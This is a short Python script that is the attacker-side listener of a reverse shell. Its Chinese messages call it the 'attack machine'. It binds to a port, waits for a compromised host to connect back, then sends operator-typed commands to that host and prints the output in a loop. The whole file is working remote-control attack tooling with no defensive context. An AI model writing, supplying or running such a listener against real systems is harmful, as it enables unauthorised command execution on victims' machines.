import socket
import sys

if len(sys.argv) == 3:
    ip = sys.argv[1]
    port = int(sys.argv[2])
    attack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    attack_socket.bind((ip, port))
    attack_socket.listen(5)
    print('攻击机开启监听...')
    (new_socket, addr) = attack_socket.accept()
    while True:
        cmd = input('cmd>>>')
        if cmd.strip():
            new_socket.send(cmd.encode(encoding='utf-8'))
            msg = new_socket.recv(4096)
            print(msg.decode())
else:
    print('输入参数错误！')
